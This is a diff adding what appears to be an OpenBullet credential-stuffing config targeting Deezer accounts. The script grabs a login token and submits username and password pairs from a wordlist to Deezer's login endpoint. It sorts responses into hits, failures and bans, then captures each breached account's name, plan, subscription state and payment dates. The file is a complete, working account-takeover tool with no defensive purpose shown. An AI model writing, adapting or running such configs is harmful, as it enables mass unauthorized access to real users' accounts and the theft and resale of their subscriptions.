@@ -1,0 +1,96 @@
+[SETTINGS]
+{
+  "Name": "Deezer",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-31T13:52:29.4227783+02:00",
+  "AdditionalInfo": "",
+  "Author": "LethalLuck",
+  "Version": "1.3.5 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Transparent": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.deezer.com/ajax/gw-light.php?method=deezer.getUserData&input=3&api_version=1.0&api_token=" 
+  CONTENT "{}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Deezer/4.11.2 (Electron; windows/10.0.18362; Desktop; us)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "checkFormLogin" -> VAR "check" 
+
+REQUEST POST "https://www.deezer.com/ajax/action.php" 
+  CONTENT "type=login&checkFormLogin=<check>&mail=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Deezer/4.11.2 (Electron; windows/10.0.18362; Desktop; us)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "success" 
+    KEY "<COOKIES>" Contains "sid," 
+  KEYCHAIN Failure AND 
+    KEY "error" 
+    KEY "<COOKIES>" Contains "sid," 
+  KEYCHAIN Ban OR 
+    KEY "error_and_instant_auth" 
+
+REQUEST GET "https://www.deezer.com/ajax/gw-light.php?method=deezer.getUserData&input=3&api_version=1.0&api_token=" 
+  
+  HEADER "User-Agent: Deezer/4.11.2 (Electron; windows/10.0.18362; Desktop; us)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "BLOG_NAME" -> CAP "Name" 
+
+PARSE "<SOURCE>" JSON "name" -> VAR "Plan" 
+
+PARSE "<SOURCE>" JSON "can_subscribe" -> VAR "Subscribed" 
+
+FUNCTION Translate 
+  KEY "True" VALUE "False" 
+  KEY "False" VALUE "True" 
+  "<Subscribed>" -> CAP "Subscribed" 
+
+FUNCTION Replace "False" "Deezer Free" "<Subscribed>" -> CAP "Plan" 
+
+PARSE "<SOURCE>" JSON "DATE_START" -> CAP "Payment Made" 
+
+PARSE "<SOURCE>" JSON "DATE_END" -> CAP "Payment Due" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Plan>" EqualTo "Deezer Free" 
+
